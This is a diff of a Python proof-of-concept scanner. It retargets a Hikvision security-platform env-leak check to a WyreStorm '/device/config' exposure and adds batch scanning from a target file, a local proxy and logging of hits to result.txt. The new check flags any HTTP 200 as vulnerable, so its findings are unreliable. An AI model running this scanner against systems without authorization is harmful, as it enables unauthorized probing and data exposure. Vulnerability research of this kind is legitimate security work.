@@ -3,7 +3,7 @@ import re
 import argparse
 import sys
 from multiprocessing.dummy import Pool
-requests.packages.urllib3.disable_warnings()
+# requests.packages.urllib3.disable_warnings()
 def banner():
     test = """
  __      __                         _________ __                        
@@ -19,7 +19,7 @@ def banner():
 def main():
     banner()
     #处理命令行输入的参数
-    parser = argparse.ArgumentParser(description="HiKVISION综合安防管理平台env信息泄漏")
+    parser = argparse.ArgumentParser(description="WyreStorm存在弱口令漏洞")
     parser.add_argument('-u','--url',dest='url',type=str,help='Please input link')
     parser.add_argument('-f','--file',dest='file',type=str,help='Please input file')
     #处理参数
@@ -39,19 +39,22 @@ def main():
         print(f"Usage:\n\t python {sys.argv[0]} -h")
 
 def poc(target):
-    payload = '/artemis-portal/artemis/env '
+    payload = '/device/config'
     url = target + payload
     headers = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36',
         'Connection': 'close',
+        'Accept': '*/*',
+        'Accept-Language': 'en',
+        'Accept-Encoding': 'gzip'		
     }
     proxies = {
         'http': 'http://127.0.0.1:8080',
         'https': 'http://127.0.0.1:8080'
     }
     try:
-        response = requests.get(url=url,headers=headers,verify=False)
-        if response.status_code == 200 and "profiles" in response.text:
+        response = requests.get(url=url,headers=headers,proxies=proxies,verify=False)
+        if response.status_code == 200:
             print(f"[*该网址存在信息泄露漏洞{target}]")
             with open('result.txt', 'a', encoding='utf-8') as f:
                 f.write(target + '\n')
